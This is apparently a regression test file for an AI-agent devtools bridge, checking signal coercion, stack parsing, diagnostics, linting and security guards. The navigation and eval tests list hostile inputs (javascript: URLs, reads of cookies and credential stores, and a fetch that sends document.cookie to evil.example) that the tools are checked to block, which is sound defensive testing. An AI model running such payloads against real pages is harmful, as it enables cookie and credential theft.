/**
 * Earlier audit fixes, kept as regressions:
 *   - P0-2: what_set_signal JSON coercion (no double-stringify)
 *   - P1-7: what_errors stack parsing (file/line/component extracted)
 *   - P1-8: what_page_map per-category budgets
 *   - P2-3: what_diagnose hides noisy subscriber rankings when max == 1
 *   - what_navigate URL validation
 *   - what_eval: only the fixed safe reads run without --unsafe-eval
 *   - P2-8: what_lint runs eslint-plugin-what's rules by name (moved imports, unnamed module-scope signals)
 *
 * Real bridge, scripted page (test/helpers/fake-page.js).
 */

import { describe, it, afterEach } from 'node:test';
import assert from 'node:assert/strict';
import { startBridge, connectPage, connectTools } from './helpers/fake-page.js';
import { registerAgentTools } from '../src/tools-agent.js';

let cleanups = [];
async function setup({ state, handle } = {}) {
  const started = await startBridge();
  cleanups.push(() => started.close());
  const connecting = connectPage(started.bridge, {
    state: state || { signals: [{ id: 85, name: 'items', rev: 0, value: [] }], effects: [], components: [{ id: 1, name: 'TaskList', parentId: null }] },
    handle,
  });
  cleanups.push(() => connecting.close());
  const page = await connecting.ready;
  const tools = await connectTools(started.bridge);
  cleanups.push(() => tools.close());
  registerAgentTools(tools.server, started.bridge);
  return { page, call: async (name, args) => (await tools.call(name, args)).parsed };
}

afterEach(async () => {
  for (const cleanup of cleanups.reverse()) await cleanup();
  cleanups = [];
});

const settle = () => new Promise((resolve) => setTimeout(resolve, 30));

describe('P0-2 — what_set_signal JSON coercion', () => {
  const sentValue = async (value) => {
    const { page, call } = await setup();
    await call('what_set_signal', { signalId: 85, value });
    return page.received.find((m) => m.command === 'set-signal').args.value;
  };

  it('parses stringified array payloads into native arrays', async () => {
    const value = await sentValue('[{"id":1,"name":"X"},{"id":2,"name":"Y"}]');
    assert.ok(Array.isArray(value));
    assert.equal(value[1].id, 2);
  });

  it('parses stringified number into native number', async () => {
    assert.equal(await sentValue('42'), 42);
  });

  it('leaves plain user strings alone', async () => {
    assert.equal(await sentValue('hello world'), 'hello world');
  });

  it('passes native arrays through untouched', async () => {
    assert.deepEqual(await sentValue([{ id: 1 }]), [{ id: 1 }]);
  });
});

describe('P1-7 — what_errors stack parsing', () => {
  it('extracts file/line and component from a typical V8 stack', async () => {
    const { page, call } = await setup();
    page.push('component:mounted', { id: 7, name: 'TaskList', parentId: null });
    page.push('error:captured', {
      message: 'count is not defined',
      type: 'uncaught',
      stack: [
        'Error: count is not defined',
        '    at TaskList (http://localhost:5173/src/components/TaskList.jsx:42:13)',
        '    at runComponent (http://localhost:5173/node_modules/.vite/deps/what-core.js:200:5)',
      ].join('\n'),
    });
    await settle();
    const err = (await call('what_errors')).errors[0];
    assert.ok(err.at.endsWith('TaskList.jsx:42:13'), err.at);
    assert.equal(err.component, 'TaskList');
    assert.ok(err.hint.includes("'count'"), err.hint);
  });

  it('skips framework internal frames when picking file/line', async () => {
    const { page, call } = await setup();
    page.push('error:captured', {
      message: 'x.foo is not a function',
      type: 'uncaught',
      stack: [
        'TypeError: x.foo is not a function',
        '    at notify (http://localhost:5173/node_modules/what-core/src/reactive.js:10:1)',
        '    at MyComp (http://localhost:5173/src/MyComp.jsx:8:3)',
      ].join('\n'),
    });
    await settle();
    assert.ok((await call('what_errors')).errors[0].at.endsWith('MyComp.jsx:8:3'));
  });
});

describe('P1-8 — what_page_map per-category budgets', () => {
  it('returns headings/components even when there are many landmarks', async () => {
    const { call } = await setup({
      handle: (command) => (command === 'page-map' ? {
        viewport: { width: 1280, height: 720 },
        landmarks: Array.from({ length: 250 }, (_, i) => ({ tag: 'section', text: `l${i}`, rect: {} })),
        interactives: [],
        headings: Array.from({ length: 12 }, (_, i) => ({ level: 2, text: `h${i}` })),
        components: Array.from({ length: 5 }, (_, i) => ({ id: i, name: `C${i}` })),
        totalElements: 267,
      } : undefined),
    });
    const out = await call('what_page_map');
    assert.ok(out.headings.length >= 1);
    assert.ok(out.components.length >= 1);
  });
});

describe('P2-3 — what_diagnose suppresses a noisy subscriber ranking', () => {
  const effect = (id, name, depSignalIds, runCount) => ({ id, name, kind: 'effect', runCount, depSignalIds, depComputedIds: [] });

  it('omits mostSubscribed when no signal has more than one subscriber', async () => {
    const { call } = await setup({ state: {
      signals: [{ id: 1, name: 'a', rev: 0, value: 0 }, { id: 2, name: 'b', rev: 0, value: 0 }],
      effects: [effect(1, 'e1', [1], 1), effect(2, 'e2', [2], 1)],
      components: [],
    } });
    assert.equal((await call('what_diagnose', { focus: 'performance' })).mostSubscribed, undefined);
  });

  it('ranks signals with 2+ subscribers', async () => {
    const { call } = await setup({ state: {
      signals: [{ id: 1, name: 'a', rev: 0, value: 0 }],
      effects: [effect(1, 'e1', [1], 1), effect(2, 'e2', [1], 1)],
      components: [],
    } });
    assert.deepEqual((await call('what_diagnose', { focus: 'performance' })).mostSubscribed, ['a#1 ×2']);
  });

  it('ranks hot effects by runs above the threshold', async () => {
    const { call } = await setup({ state: {
      signals: [{ id: 1, name: 'a', rev: 0, value: 0 }],
      effects: [effect(1, 'cool', [1], 3), effect(2, 'hot', [1], 200), effect(3, 'warm', [1], 60)],
      components: [],
    } });
    const out = await call('what_diagnose', { focus: 'performance', threshold: 50 });
    assert.deepEqual(out.hotEffects, ['hot#2 ×200', 'warm#3 ×60']);
  });
});

describe('what_navigate URL validation', () => {
  const navigate = (command, args) => (command === 'navigate'
    ? { requested: args.path, browser: { path: args.path }, router: null, settled: true }
    : undefined);

  for (const path of ['javascript:alert(1)', 'JaVaScRiPt:alert(1)', 'data:text/html,<script>', 'vbscript:msgbox', '\njavascript:alert(1)']) {
    it(`rejects ${JSON.stringify(path)}`, async () => {
      const { page, call } = await setup();
      const out = await call('what_navigate', { path });
      assert.ok(/Blocked|unsafe/.test(out.error), out.error);
      assert.ok(!page.received.some((m) => m.command === 'navigate'), 'nothing reached the page');
    });
  }

  for (const path of ['/dashboard', './relative', '#hash', '?query=1', 'https://example.com']) {
    it(`allows ${path}`, async () => {
      const { page, call } = await setup({ handle: navigate });
      const out = await call('what_navigate', { path });
      assert.ok(!out.error, out.error);
      assert.ok(page.received.some((m) => m.command === 'navigate'));
      assert.equal(out.settled, true);
    });
  }
});

describe('what_eval without --unsafe-eval: only the fixed safe reads', () => {
  const reader = (command, args) => (command === 'read' ? { path: args.path, value: `value of ${args.path}` } : undefined);

  for (const code of ['document.title', 'window.location.href', 'navigator.userAgent', ' location.pathname ']) {
    it(`reads ${code.trim()} through the read command, never eval`, async () => {
      const { page, call } = await setup({ handle: reader });
      const out = await call('what_eval', { code });
      assert.ok(!out.error, out.error);
      const sent = page.received.filter((m) => m.command === 'read' || m.command === 'eval');
      assert.deepEqual(sent.map((m) => m.command), ['read']);
      assert.equal(out.result, `«value of ${code.trim().replace(/^window\./, '')}»`);
    });
  }

  for (const code of [
    'window.constructor', 'window.constructor.constructor', 'document.__proto__', 'Object.prototype',
    'window["eval"]', '', 'document', 'document.cookie', 'window.localStorage', 'window.sessionStorage',
    'window.indexedDB', 'navigator.credentials', 'window.document.cookie', 'window.opener',
    'document.body.innerHTML', 'fetch("https://evil.example/" + document.cookie)',
  ]) {
    it(`refuses ${JSON.stringify(code)} before anything reaches the page`, async () => {
      const { page, call } = await setup({ handle: reader });
      const out = await call('what_eval', { code });
      assert.match(out.error, /disabled for arbitrary code/);
      assert.ok(!page.received.some((m) => m.command === 'read' || m.command === 'eval'));
    });
  }
});

describe('P2-8 — what_lint rules shared with eslint-plugin-what', () => {
  it('runs one named rule and reports its catalogue code', async () => {
    const { call } = await setup();
    const code = "import { useForm } from 'what-framework';\nexport const form = useForm;\n";
    const out = await call('what_lint', { code, rules: ['no-moved-imports'] });
    assert.equal(out.issues[0].code, 'ERR_MOVED_IMPORT');
    assert.equal(out.issues[0].rule, 'no-moved-imports');
  });

  it('flags module-scope signals missing a debug name', async () => {
    const { call } = await setup();
    const code = "import { signal } from 'what-framework';\nexport const todos = signal([]);\nexport const count = signal(0, 'count');\n";
    const messages = (await call('what_lint', { code, rules: ['signal-debug-name'] })).issues.map((i) => i.message).join('\n');
    assert.match(messages, /todos/);
    assert.doesNotMatch(messages, /'count'/);
  });
});

describe('verifier regressions', () => {
  it('prioritizes written user signals and reports shared computed work', async () => {
    const signals = [
      ...Array.from({ length: 12 }, (_, i) => ({ id: i + 1, name: `what-router:${i}`, rev: 3 })),
      { id: 13, name: 'cart', rev: 2, loc: 'src/Lab.js:10:16', owner: '<Lab>' },
      { id: 14, name: 'rows', rev: 5 },
    ];
    const effects = Array.from({ length: 3 }, (_, i) => ({
      id: i + 1, name: `computed_${i + 1}`, loc: 'src/Row.js:2:4',
      componentId: i + 1, kind: 'computed', depSignalIds: [14], runCount: 6,
    }));
    const components = effects.map((e) => ({ id: e.componentId, name: 'Row' }));
    const { call } = await setup({ state: { signals, effects, components } });
    const diagnosed = await call('what_diagnose');
    assert.equal(diagnosed.unreadSignals.written, 1);
    assert.deepEqual(diagnosed.unreadSignals.sample[0], { id: 13, name: 'cart', loc: 'src/Lab.js:10:16', owner: '<Lab>', writes: 2 });
    assert.deepEqual(diagnosed.repeatedComputeds, [{ owner: '<Row>', loc: 'src/Row.js:2:4', count: 3, runs: 18, signals: ['rows#14'] }]);
    assert.match(diagnosed.status, /unreadSignals/);
    assert.match(diagnosed.status, /hotEffects/);
  });

  it('surfaces stalled async work and a partial registry in orientation', async () => {
    const effects = [{ id: 1, name: 'report', kind: 'computed', async: { status: 'unresolved', inFlight: { startedAt: Date.now() - 6000 } } }];
    const { call } = await setup({ state: { signals: [], effects, components: [], droppedBeforeInstall: { signals: 0, effects: 3, components: 1 } } });
    const status = await call('what_connection_status');
    assert.equal(status.stalled.work[0].name, 'report');
    assert.deepEqual(status.registry, { truncated: true, tracked: { signals: 0, effects: 1, components: 0 }, droppedBeforeInstall: { signals: 0, effects: 3, components: 1 } });
    assert.deepEqual((await call('what_effects')).registry, status.registry);
  });

  it('ships action completions and array invalidation targets', async () => {
    const { page, call } = await setup({ handle: (command, args) => command === 'invalidate-cache' ? { invalidated: args.key } : undefined });
    page.push('action', { name: 'addTodo', outcome: 'ok', invalidated: [], revalidated: [] });
    await settle();
    const log = await call('what_events', { types: ['action'] });
    assert.equal(log.actions.length, 1);
    assert.deepEqual(log.actions[0], {
      seq: log.actions[0].seq, name: '«addTodo»', outcome: 'ok', invalidated: [], revalidated: [],
    });
    assert.deepEqual((await call('what_invalidate_cache', { key: ['todos'] })).invalidated, ['todos']);
  });
});
